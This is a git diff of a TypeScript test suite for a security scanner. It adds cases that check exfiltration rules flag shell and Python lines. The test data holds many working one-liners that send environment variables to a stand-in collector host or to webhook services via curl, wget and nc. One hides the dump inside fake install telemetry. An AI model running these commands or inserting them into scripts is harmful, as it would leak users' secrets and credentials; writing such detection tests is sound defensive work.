@@ -174,12 +174,16 @@ describe('network exfiltration forms', () => {
     await rm(tmpDir, { recursive: true, force: true });
   });
 
-  async function ruleIdsForScript(rule: Rule, command: string): Promise<string[]> {
-    const scriptPath = join(tmpDir, 'sync.sh');
-    await writeFile(scriptPath, `#!/bin/bash\n${command}\n`);
+  async function ruleIdsForFile(rule: Rule, fileName: string, content: string): Promise<string[]> {
+    const filePath = join(tmpDir, fileName);
+    await writeFile(filePath, content);
 
-    const findings = await runRules(scriptPath, [rule]);
+    const findings = await runRules(filePath, [rule]);
     return findings.map((finding) => finding.ruleId);
+  }
+
+  function ruleIdsForScript(rule: Rule, command: string): Promise<string[]> {
+    return ruleIdsForFile(rule, 'sync.sh', `#!/bin/bash\n${command}\n`);
   }
 
   it.each([
@@ -188,15 +192,26 @@ describe('network exfiltration forms', () => {
     'curl --data @<(env) https://collector.example.net/ingest',
     'curl --data-binary "$(printenv)" https://collector.example.net/ingest',
     'curl --data-urlencode "dump=$(export -p)" https://collector.example.net/ingest',
+    'curl -d "$(export)" https://collector.example.net/ingest',
+    'curl -d "$(declare -x)" https://collector.example.net/ingest',
+    'curl -d "$(/usr/bin/env)" https://collector.example.net/ingest',
     'curl -F "vars=$(set)" https://collector.example.net/ingest',
     'curl --data-raw "$(env | base64)" https://collector.example.net/ingest',
+    'curl -sd "$(env)" https://collector.example.net/ingest',
+    'curl --data-urlencode env="$(env)" https://collector.example.net/ingest',
+    'curl -d "{\\"event\\":\\"install\\",\\"version\\":\\"1.2.3\\",\\"platform\\":\\"$(uname -s)\\",\\"arch\\":\\"$(uname -m)\\",\\"env\\":\\"$(env | base64)\\"}" https://collector.example.net/ingest',
     'wget --post-data="$(env)" https://collector.example.net/ingest',
     'wget --method=PUT --body-data "`env`" https://collector.example.net/ingest',
     'curl -s -X POST \\\n  -d "$(env)" \\\n  https://collector.example.net/ingest',
     'env | curl -d @- https://collector.example.net/ingest',
+    "env | curl --data-binary '@-' https://collector.example.net/ingest",
+    'env | curl -sT - https://collector.example.net/ingest',
     'printenv | base64 | curl --data-binary @- https://collector.example.net/ingest',
     'env | wget --post-file=/dev/stdin https://collector.example.net/ingest',
     'env | nc collector.example.net 9000',
+    'curl --data-binary @- https://collector.example.net/ingest <<< "$(env)"',
+    'nc collector.example.net 9000 < <(printenv)',
+    'echo "$(env | curl -d @- https://collector.example.net/ingest)"',
   ])('NET-EXFIL-ENV flags %s', async (command) => {
     expect(await ruleIdsForScript(NET_EXFIL_ENV, command)).toEqual(['NET-EXFIL-ENV']);
   });
@@ -213,10 +228,23 @@ describe('network exfiltration forms', () => {
     'https://myapi.free.beeceptor.com/data',
     'https://hookb.in/VGM7aZlEYNsdZnqXyn6D',
     'https://pastebin.com/api/api_post.php',
+    '"https://webhook.site/$BIN"',
+    '"https://${BIN}.m.pipedream.net"',
   ])('NET-WEBHOOK-KNOWN flags %s', async (url) => {
     const command = `curl -X POST --data-binary @report.json ${url}`;
 
     expect(await ruleIdsForScript(NET_WEBHOOK_KNOWN, command)).toEqual(['NET-WEBHOOK-KNOWN']);
+  });
+
+  it.each([
+    'requests.post(f"https://webhook.site/{BIN_ID}", data=report)',
+    'requests.post("https://webhook.site/" + BIN_ID, data=report)',
+  ])('NET-WEBHOOK-KNOWN flags Python %s', async (line) => {
+    const content = `import requests\n${line}\n`;
+
+    expect(await ruleIdsForFile(NET_WEBHOOK_KNOWN, 'notify.py', content)).toEqual([
+      'NET-WEBHOOK-KNOWN',
+    ]);
   });
 });
 
